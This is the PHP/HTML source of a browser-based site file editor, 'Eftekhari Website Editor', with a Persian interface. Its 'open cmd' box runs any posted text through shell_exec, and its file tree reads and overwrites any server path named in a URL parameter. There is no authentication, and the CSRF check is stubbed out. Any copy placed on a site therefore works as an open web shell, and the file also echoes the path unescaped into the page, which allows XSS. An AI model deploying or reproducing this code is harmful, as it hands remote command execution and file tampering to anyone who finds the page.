<!DOCTYPE html>
<html lang="fa-IR" dir="rtl" >
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Eftekhari Website Editor</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.32.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/keymap/sublime.min.js" integrity="sha512-SV3qeFFtzcmGtUQPLM7HLy/7GKJ/x3c2PdiF5GZQnbHzIlI2q7r77y0IgLLbBDeHiNfCSBYDQt898Xp0tcZOeA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.32.0/codemirror.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/theme/ambiance.min.css" integrity="sha512-wVrMpCao81zIdzAM+fYyuF6BoUXjDO8le2mQXl4iVezdDSgZOCFtpm/AL3LZn9dqc3e4CloZfiZxhTp5UNpWIw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/htmlmixed/htmlmixed.min.js" integrity="sha512-HN6cn6mIWeFJFwRN9yetDAMSh+AK9myHF1X9GlSlKmThaat65342Yw8wL7ITuaJnPioG0SYG09gy0qd5+s777w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/xml/xml.min.js" integrity="sha512-LarNmzVokUmcA7aUDtqZ6oTS+YXmUKzpGdm8DxC46A6AHu+PQiYCUlwEGWidjVYMo/QXZMFMIadZtrkfApYp/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/javascript/javascript.min.js" integrity="sha512-I6CdJdruzGtvDyvdO4YsiAq+pkWf2efgd1ZUSK2FnM/u2VuRASPC7GowWQrWyjxCZn6CT89s3ddGI+be0Ak9Fg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/css/css.min.js" integrity="sha512-oikhYLgIKf0zWtVTOXh101BWoSacgv4UTJHQOHU+iUQ1Dol3Xjz/o9Jh0U33MPoT/d4aQruvjNvcYxvkTQd0nA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/clike/clike.min.js" integrity="sha512-l8ZIWnQ3XHPRG3MQ8+hT1OffRSTrFwrph1j1oc1Fzc9UKVGef5XN9fdO0vm3nW0PRgQ9LJgck6ciG59m69rvfg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/php/php.min.js" integrity="sha512-jZGz5n9AVTuQGhKTL0QzOm6bxxIQjaSbins+vD3OIdI7mtnmYE6h/L+UBGIp/SssLggbkxRzp9XkQNA4AyjFBw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/addon/hint/show-hint.min.css" integrity="sha512-OmcLQEy8iGiD7PSm85s06dnR7G7C9C0VqahIPAj/KHk5RpOCmnC6R2ob1oK4/uwYhWa9BF1GC6tzxsC8TIx7Jg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/addon/hint/show-hint.min.js" integrity="sha512-Rx36KK4rJrsLJhzLBmhWGdQJKoog81hHm+0qBZD6IEF2+D+CqWiuiXhtAXoxJzucl4mx8zTYCGKX6zgq6+yLGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/addon/hint/css-hint.min.js" integrity="sha512-1BD3lo262s+DtDFoeD8+ssEL1zVJU8SHWWMtUyxfLqMV/jQDEnyQlS/CL3mD1kkLSv2hhYq1sdcA/zAPDz4JVA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/addon/hint/html-hint.min.js" integrity="sha512-oxBKDzXElkyh3mQC/bKA/se1Stg1Q6fm7jz7PPY2kL01jRHQ64IwjpZVsuZojcaj5g8eKSMY9UJamtB1QR7Dmw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/addon/hint/javascript-hint.min.js" integrity="sha512-omIxBxPdObb7b3giwJtPBiB86Mey/ds7qyKFcRiaLQgDxoSR+UgCYEFO7jRZzPOCZAICabGCraEhOSa71U1zFA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/addon/selection/active-line.min.js" integrity="sha512-0sDhEPgX5DsfNcL5ty4kP6tR8H2vPkn40GwA0RYTshkbksURAlsRVnG4ECPPBQh7ZYU6S3rGvp5uhlGQUNrcmA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/addon/edit/matchbrackets.min.js" integrity="sha512-GSYCbN/le5gNmfAWVEjg1tKnOH7ilK6xCLgA7c48IReoIR2g2vldxTM6kZlN6o3VtWIe6fHu/qhwxIt11J8EBA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/theme/monokai.min.css" integrity="sha512-R6PH4vSzF2Yxjdvb2p2FA06yWul+U0PDDav4b/od/oXf9Iw37zl10plvwOXelrjV2Ai7Eo3vyHeyFUjhXdBCVQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/fold/foldcode.min.js" integrity="sha512-Q2qfEJEU257Qlqc4/5g6iKuJNnn5L0xu2D48p8WHe9YC/kLj2UfkdGD01qfxWk+XIcHsZngcA8WuKcizF8MAHA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/edit/closebrackets.min.js" integrity="sha512-tsjcYO5hFvViRssxiM7Jhd8601epWOx1He3Hl4yuI5dKKPxr43KxkOhc9GZeeqzlYJm9ABb7UPA9697NiqZZ7Q==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/edit/closetag.min.js" integrity="sha512-XYx5xhl4B5vKNlaRBWh/nlti0+IPM6eT+dSFc3/oc4rERn2DpwbS3q4OblprqqBLXyRSVePKmf+8mHkDLtGZpg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/search/search.min.js" integrity="sha512-Mw3RqCUHTyvN3iSp5TSs731TiLqnKrxzyy2UVZv3+tJa524Rj7pBC7Ivv3ka2oDnkQwLOMHNDKU5nMJ16YRgrA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/search/searchcursor.min.js" integrity="sha512-+ZfZDC9gi1y9Xoxi9UUsSp+5k+AcFE0TRNjI0pfaAHQ7VZTaaoEpBZp9q9OvHdSomOze/7s5w27rcsYpT6xU6g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/display/fullscreen.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/display/fullscreen.min.js"></script><link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazir-font@v30.1.0/dist/font-face.css" rel="stylesheet">
    <style>
        .CodeMirror {
            border: 1px solid #eee;
            height: auto;
            font-family: 'Vazir', 'Tahoma', sans-serif;
        }
        .back-to-top {
            position: fixed;
            bottom: 25px;
            right: 25px;
            display: none;
        }
        .alert {
            padding: 20px;
            background-color:#157347;
            color: white;
        }
        .closebtn {
            margin-left: 15px;
            color: white;
            font-weight: bold;
            float: right;
            font-size: 22px;
            line-height: 20px;
            cursor: pointer;
            transition: 0.3s;
        }
        .closebtn:hover {
            color: black;
        }
        .sa-lime {
            color:#157347 ;
        }
        .sa-rtl {
            direction: rtl;
            text-align: right;
        }
        .sa-cen {
            direction: rtl;
            text-align: center;
        }
        .sa-ltr {
            direction: ltr;
            text-align: left;
        }
        #code-editor{

        }
    </style>
    <style>
        #codeEditor, #lineCounter {
            font-family: lucida console, courier new, courier, monospace;
            margin: 0;
            padding: 10px 0;
            height: 40vh;
            border-radius: 0;
            resize: none;
            font-size: 16px;
            line-height: 1.2;
            outline: none;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }
        #codeEditor {
            padding-left: calc(3.5rem + 5px);
            width:100%;
            /* Determine appearance of code editor */
            background-color:#272822;
            border-color:#272822;
            color:#ffffff;
        }
        #lineCounter {
            display: flex;
            border-color: transparent;
            overflow-y: hidden;
            text-align: right;
            box-shadow: none;
            color: #707070;
            background-color: #d8d8d8;
            position: absolute;
            width: 3.5rem;
            /* Determine appearance of line counter */
            background-color:#3E3D32;
            border-color:#3E3D32;
            color:#928869;
        }
        #lineCounter:focus-visible,
        #codeEditor:focus-visible {
            outline:none;
        }
        ul.mytree-ul {
            list-style: none;
            margin-left: 20px;
            padding-left: 15px;
            border-left: 1px dotted #aaa;
        }

        ul.mytree-ul li {
            margin: 4px 0;
            position: relative;
        }

        ul.mytree-ul li .mytree-toggle {
            cursor: pointer;
            font-size: 18px;
            margin-right: 5px;
            font-weight: bold;
            user-select: none;
            color: #0d6efd;
        }

        ul.mytree-ul li .mytree-folder {
            font-weight: bold;
            color: #157347;
            cursor: default;
        }

        ul.mytree-ul li a {
            text-decoration: none;
            color: #333;
        }

        ul.mytree-ul li a.mytree-active {
            font-weight: bold;
            color: #d9534f;
        }

        .mytree-hidden {
            display: none;
        }


    </style>
    <link rel="icon" type="image/svg+xml"
          href="data:image/svg+xml,%3Csvg id='Layer_1' data-name='Layer 1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' viewBox='0 0 2160 2160'%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill:url(%23linear-gradient);%7D.cls-2%7Bfill:url(%23linear-gradient-2);%7D.cls-3%7Bfill:url(%23linear-gradient-3);%7D.cls-4%7Bfill:url(%23linear-gradient-4);%7D.cls-5%7Bfont-size:190px;fill:%2300298e;font-family:Calibri;%7D.cls-6%7Bletter-spacing:0em;%7D.cls-7%7Bletter-spacing:-0.01em;%7D%3C/style%3E%3ClinearGradient id='linear-gradient' x1='472.85' y1='957.44' x2='654.88' y2='957.44' gradientUnits='userSpaceOnUse'%3E%3Cstop offset='0' stop-color='%230061ff'/%3E%3Cstop offset='1' stop-color='%231b141a'/%3E%3C/linearGradient%3E%3ClinearGradient id='linear-gradient-2' x1='373' y1='861.82' x2='1056.19' y2='861.82' xlink:href='%23linear-gradient'/%3E%3ClinearGradient id='linear-gradient-3' x1='677.16' y1='1181.33' x2='882.61' y2='1181.33' xlink:href='%23linear-gradient'/%3E%3ClinearGradient id='linear-gradient-4' x1='695.59' y1='1038.28' x2='1754.36' y2='1038.28' xlink:href='%23linear-gradient'/%3E%3C/defs%3E%3Ctitle%3EArtboard ۲%3C/title%3E%3Cpolygon class='cls-1' points='654.88 974.53 654.88 930.75 543.51 1005.64 490.52 952.64 472.85 869.31 472.85 978.76 533.53 1045.58 654.88 974.53'/%3E%3Cpolygon class='cls-2' points='677.54 979.91 677.54 571.3 706.73 649.64 762.03 551.33 774.32 606.63 841.39 560.29 828.08 595.88 940.98 570.02 1056.19 651.69 987.84 906.94 509.72 1172.31 373 1012.17 451.73 839.74 451.73 1006.02 511.06 1065.35 677.54 979.91'/%3E%3Cpolygon class='cls-3' points='825.01 1175.38 827.31 1221.46 791.21 1240.66 775.08 1206.1 806.96 1023.3 681.38 1098.57 677.16 1214.17 738.98 1339.36 882.61 1275.23 875.7 1160.4 825.01 1175.38'/%3E%3Cpath class='cls-4' d='M1605.35,1375.07l-9.21-185.48-65.67-124.43,128.26,68.36-242.7-298L1070.78,670,999.36,916.16l-132.88,81,50.69,121,131.34,157.45-7.68,99.46-30.72-2.68,8.45-107.15L913,1146.58V1304l-46.85,76-170.51,26.49,1058.77-4.22Zm-151.3-3.45-74.51,2.3,2.31-57.22,19.58-47.23-126-10.37v41.09l-43.78,78-53.76-1.92-6.53-117.13-23.81-72.58,38-88.72-13.82,77.58,21.88,62.6,233.11,18.81,43.78,61.06Z'/%3E%3Ctext class='cls-5' transform='translate(664.9 1549.29)'%3EPhpd%3Ctspan class='cls-6' x='397.63' y='0'%3Ee%3C/tspan%3E%3Ctspan class='cls-7' x='491.24' y='0'%3Ev%3C/tspan%3E%3Ctspan x='575.2' y='0'%3Eelop.er%3C/tspan%3E%3C/text%3E%3C/svg%3E" />
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            document.body.addEventListener("click", function (e) {
                if (e.target.classList.contains("mytree-toggle")) {
                    const nextUl = e.target.parentElement.querySelector("ul.mytree-ul");
                    if (nextUl) {
                        if (nextUl.classList.contains("mytree-hidden")) {
                            nextUl.classList.remove("mytree-hidden");
                            e.target.textContent = "-";
                        } else {
                            nextUl.classList.add("mytree-hidden");
                            e.target.textContent = "+";
                        }
                    }
                }
            });

            // مسیر فایل انتخاب‌شده باز بماند
            document.querySelectorAll("a.mytree-active").forEach(function (activeLink) {
                let parent = activeLink.closest("ul.mytree-ul");
                while (parent && parent.previousElementSibling && parent.previousElementSibling.classList.contains("mytree-toggle")) {
                    parent.classList.remove("mytree-hidden");
                    parent.previousElementSibling.textContent = "-";
                    parent = parent.parentElement.closest("ul.mytree-ul");
                }
            });
        });
    </script>


</head>

<body style="background-color:#000000 !important;">
<div class="container ">

    <div class="w3-container">
        <a class="btn btn-warning closebtn"  role="button" onclick="document.getElementById('cmddiv').style.display='block';">
            open cmd
        </a>
        <div id="cmddiv" style="<?php if (empty($_POST['cmd'])){echo 'display:none';}else{echo 'display:block';} ?>">
            <?php
            if (!function_exists('csrf_token')){
                function csrf_token(){return 0 ;} ;
            }?>
            <form class="container sa-ltr"  method="post">
                <input type="hidden" name="_token" value="<?=csrf_token()?>" />
                <input type="text" class="form-control bg-dark text-primary" name="cmd" id="cmd">
                <input class="btn btn-primary" type="submit" name="submit2" value="RUN 2>&1">
                <button type="submit" name="submit" class="btn btn-primary" style="background-color : purple;border-color: purple">RUN </button>
                <a class="btn btn-warning closebtn"  role="button" onclick="document.getElementById('cmddiv').style.display='none';">
                    close
                </a>
                <div style="<?php if (empty($_POST['cmd'])){echo 'display:none';} ?>" >
                    <span class="closebtn " onclick="this.parentElement.style.display='none';">&times;</span>
                    <p><textarea class="sa-ltr" id='lineCounter' wrap='off' readonly>1.</textarea><textarea id='codeEditor' wrap='off' name="history" >
                    </textarea></p>
                </div>



            </form>
        </div>
        <script>
            var htmlTemplateStr = <?php
                if (!empty($_POST['cmd'])){
                    if (isset($_POST['submit2'])){
                        $cmd =$_POST['cmd'].' 2>&1' ;
                    }else{
                        $cmd =$_POST['cmd'] ;
                    }
                    echo  trim(json_encode(shell_exec(trim($cmd))));
                }
                //var_dump(shell_exec(trim($cmd)));
                ?>;
            var codeEditor = document.getElementById('codeEditor');
            var lineCounter = document.getElementById('lineCounter');

            var lineCountCache = 0;
            function line_counter() {
                var lineCount = codeEditor.value.split('\n').length;
                var outarr = new Array();
                if (lineCountCache != lineCount) {
                    for (var x = 0; x < lineCount; x++) {
                        outarr[x] = (x + 1) + '.';
                    }
                    lineCounter.value = outarr.join('\n');
                }
                lineCountCache = lineCount;
            }

            codeEditor.addEventListener('scroll', () => {
                lineCounter.scrollTop = codeEditor.scrollTop;
                lineCounter.scrollLeft = codeEditor.scrollLeft;
            });

            codeEditor.addEventListener('input', () => {
                line_counter();
            });

            codeEditor.addEventListener('keydown', (e) => {
                let { keyCode } = e;
                let { value, selectionStart, selectionEnd } = codeEditor;

                if (keyCode === 9) {  // TAB = 9
                    e.preventDefault();
                    codeEditor.value = value.slice(0, selectionStart) + '\t' + value.slice(selectionEnd);
                    codeEditor.setSelectionRange(selectionStart+2, selectionStart+2)
                }
            });
            codeEditor.value = htmlTemplateStr;
            line_counter();
            codeEditor.scrollTop=codeEditor.scrollHeight;
        </script>
    </div>

    <div class="container sa-ltr ">
        <br>
        <br>

        <?php
        $chek_dir[1] = __DIR__ . '/';
        $chek_dir[1] = __DIR__ . '/../';
        $selectedFile = $_GET['ed'] ?? null;

        if (isset($_POST['codesubmit'])) {
            file_put_contents($_GET['ed'], $_POST['content']);
            ?>
            <div class="alert sa-rtl">
                <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
                <strong> ذخیره شد ! </strong> <strong>تغییرات با موفقیت انجام شد</strong>
            </div>
        <?php }

        $url = strtok($_SERVER["REQUEST_URI"], "?");

        function renderTreeCustom($dir, $baseUrl, $selectedFile)
        {
            $items = scandir($dir);
            $dirs = [];
            $files = [];

            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $path = realpath($dir . DIRECTORY_SEPARATOR . $item);
                if (is_dir($path)) {
                    $dirs[] = $item;
                } else {
                    $files[] = $item;
                }
            }

            natcasesort($dirs);
            natcasesort($files);

            echo '<ul class="mytree-ul">';
            foreach ($dirs as $d) {
                $path = realpath($dir . DIRECTORY_SEPARATOR . $d);
                $isSelected = ($selectedFile && strpos($selectedFile, $path) === 0);

                echo '<li>';
                echo '<span class="mytree-toggle">+</span> <span class="mytree-folder">' . htmlspecialchars($d) . '</span>';

                // همیشه زیرشاخه‌ها رو تولید کن، فقط اگه انتخاب نشده بودن مخفی کن
                echo '<ul class="mytree-ul' . ($isSelected ? '' : ' mytree-hidden') . '">';
                renderTreeCustom($path, $baseUrl, $selectedFile);
                echo '</ul>';

                echo '</li>';
            }


            foreach ($files as $f) {
                $path = realpath($dir . DIRECTORY_SEPARATOR . $f);
                $link = $baseUrl . '?ed=' . urlencode($path);
                $active = ($selectedFile === $path) ? ' class="mytree-active"' : '';
                echo '<li><a href="' . $link . '"' . $active . '>' . htmlspecialchars($f) . '</a></li>';
            }
            echo '</ul>';
        }

        foreach ($chek_dir as $one_dir) {
            renderTreeCustom($one_dir, $url, $selectedFile);
        }

        if (!empty($_GET['ed'])) {
            $path_to_file = $_GET['ed'];
            $file_contents = file_get_contents($path_to_file);
            echo '<h4 class="sa-lime sa-ltr">' . $_GET['ed'] . ' +++ شما در حال تغییر فایل زیر هستید +++</h4>';
        } else {
            $file_contents = '';
        }
        ?>




        <script>

            $(document).ready(function() {
                var codeEditorElement = $(".codemirror-textarea")[0];

                // تنظیم فونت فارسی (Vazir)
                var style = document.createElement('style');
                style.innerHTML = `
        .CodeMirror {
            font-family: 'Vazir', 'Tahoma', sans-serif;
            font-size: 14px;
            direction: ltr;
        }
        .rtl-text {
            direction: rtl;
            unicode-bidi: embed;
        }
    `;
                document.head.appendChild(style);

                var editor = CodeMirror.fromTextArea(codeEditorElement, {
                    mode: "application/x-httpd-php",
                    extraKeys: {
                        "Ctrl-Space": "autocomplete",
                        "F11": function(cm) {
                            cm.setOption("fullScreen", !cm.getOption("fullScreen"));
                        },
                        "Esc": function(cm) {
                            if (cm.getOption("fullScreen")) cm.setOption("fullScreen", false);
                        }
                    },
                    autoCloseBrackets: true,
                    autoCloseTags: true,
                    showCursorWhenSelecting: true,
                    tabSize: 2,
                    direction: 'ltr',
                    keyMap: "sublime",
                    lineWrapping: true,
                    lineNumbers: true,
                    matchBrackets: true,
                    theme: "monokai",
                    lineWiseCopyCut: true,
                    undoDepth: 200,
                });

                editor.setOption("font-family", "Vazir, Tahoma, sans-serif");

                var complexArray = <?php echo json_encode($file_contents); ?>;
                editor.setValue(complexArray);

                // تابع برای تشخیص کلمات فارسی و اعمال استایل
                function applyRTLStyles(cm) {
                    var content = cm.getValue();
                    var regex = /[\u0600-\u06FF\uFB8A\u067E\u0686\u06AF\u200C]+/g; // تشخیص کلمات فارسی
                    var decorations = [];

                    var match;
                    while ((match = regex.exec(content)) !== null) {
                        var from = cm.posFromIndex(match.index);
                        var to = cm.posFromIndex(match.index + match[0].length);
                        decorations.push({
                            from: from,
                            to: to,
                            options: { className: 'rtl-text' }
                        });
                    }

                    cm.getAllMarks().forEach(mark => mark.clear());
                    decorations.forEach(decoration => {
                        cm.markText(decoration.from, decoration.to, {
                            className: decoration.options.className
                        });
                    });
                }

                editor.on("change", function(cm) {
                    applyRTLStyles(cm);
                });

                applyRTLStyles(editor);
            });


            $(document).ready(function() {
                $(window).scroll(function() {
                    if ($(this).scrollTop() > 50) {
                        $('#back-to-top').fadeIn();
                    } else {
                        $('#back-to-top').fadeOut();
                    }
                });
                $('#back-to-top').click(function() {
                    $('body,html').animate({
                        scrollTop: 0
                    }, 400);
                    return false;
                });
            });

        </script>
        <div class="col-lg-12" >
            <br>

            <form action="<?= $url ?><?php
            if (!empty($_GET['ed'])) {
                echo '?ed=' . $_GET['ed'];
            } ?>" method="post" enctype="multipart/form-data">
                <input type="hidden" name="_token" value="<?=csrf_token()?>" />
                <div class="col-12 sa_rtl row">
                    <h4 id="tittle-c"> Eftekhari Website Editor  &nbsp
                        <a href="https://github.com/sajjadef98/Eftekhari-Website-Editor" target="_blank"><input class="btn btn-success" type="button" value="Support on GitHub 🌟"></a> &nbsp<input class="btn btn-primary" type="submit" name="codesubmit" value="Save">
                    </h4>
                </div> <br>

                <div class="row">
                        <textarea class="codemirror-textarea" name="content" id="code-editor" ><?php if (!empty($file_contents)) {
                                echo htmlentities( trim($file_contents),ENT_QUOTES, "UTF-8");
                            } else {
                                echo 'یک فایل را انتخاب کنید';
                            } ?></textarea>
                </div>
                <div class="row">

                    <div class="col-12 col-sm-4 mt-2"> <input class="btn btn-primary" type="submit" name="codesubmit" value="Save"></div>
                </div>
            </form>
        </div>
        <br><br><br>
    </div>
</div>
<a id="back-to-top" href="#" class="btn btn-lg back-to-top" style="border-color: purple" role="button"><svg xmlns="http://www.w3.org/2000/svg" color="purple" width="32" height="32" fill="currentColor" class="bi bi-filetype-php" viewBox="0 0 16 16">
        <path fill-rule="evenodd" d="M14 4.5V14a2 2 0 0 1-2 2h-1v-1h1a1 1 0 0 0 1-1V4.5h-2A1.5 1.5 0 0 1 9.5 3V1H4a1 1 0 0 0-1 1v9H2V2a2 2 0 0 1 2-2h5.5L14 4.5ZM1.6 11.85H0v3.999h.791v-1.342h.803c.287 0 .531-.057.732-.173.203-.117.358-.275.463-.474a1.42 1.42 0 0 0 .161-.677c0-.25-.053-.476-.158-.677a1.176 1.176 0 0 0-.46-.477c-.2-.12-.443-.179-.732-.179Zm.545 1.333a.795.795 0 0 1-.085.38.574.574 0 0 1-.238.241.794.794 0 0 1-.375.082H.788V12.48h.66c.218 0 .389.06.512.181.123.122.185.295.185.522Zm4.48 2.666V11.85h-.79v1.626H4.153V11.85h-.79v3.999h.79v-1.714h1.682v1.714h.79Zm.703-3.999h1.6c.288 0 .533.06.732.179.2.117.354.276.46.477.105.201.158.427.158.677 0 .25-.054.476-.161.677-.106.199-.26.357-.463.474a1.452 1.452 0 0 1-.733.173H8.12v1.342h-.791V11.85Zm2.06 1.714a.795.795 0 0 0 .084-.381c0-.227-.061-.4-.184-.521-.123-.122-.294-.182-.513-.182h-.66v1.406h.66a.794.794 0 0 0 .375-.082.574.574 0 0 0 .237-.24Z" />
    </svg></a>
<footer class="footer ">
    <p class="clearfix mb-0 sa-cen">
        <span class=" d-block d-md-inline-block mt-25">پیاده سازی و اجرا <a class="ml-25" href="https://sajjadef.ir/" target="_blank"> Sajjad Eftekhari</a><span class="d-none d-sm-inline-block">&nbsp;&nbsp;&nbsp; <?= date('Y') ?><span style="font-size: 18pt"> © </span> </span></span>
</footer></body></html>
